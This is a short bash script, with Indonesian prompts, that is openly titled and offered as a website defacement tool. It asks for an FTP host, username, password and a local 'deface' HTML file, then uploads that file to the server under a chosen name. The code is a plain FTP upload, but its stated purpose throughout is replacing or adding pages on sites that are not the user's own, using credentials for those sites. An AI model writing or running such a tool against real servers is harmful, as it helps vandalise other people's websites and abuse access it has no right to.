#!/bin/bash

# Script Deface via FTP
# Author: MR.M05T3R | NEWBIE CYBER SECURITY

echo "=== FTP Deface Script ==="
read -p "Masukkan FTP Host: " host
read -p "Masukkan Username: " user
read -sp "Masukkan Password: " pass
echo
read -p "Masukkan Path File Deface (HTML): " file
read -p "Masukkan Nama File di Server: " remotefile

# Jalankan FTP
ftp -inv $host <<EOF
user $user $pass
put $file $remotefile
bye
EOF

echo "Upload selesai ke $host dengan nama file $remotefile"
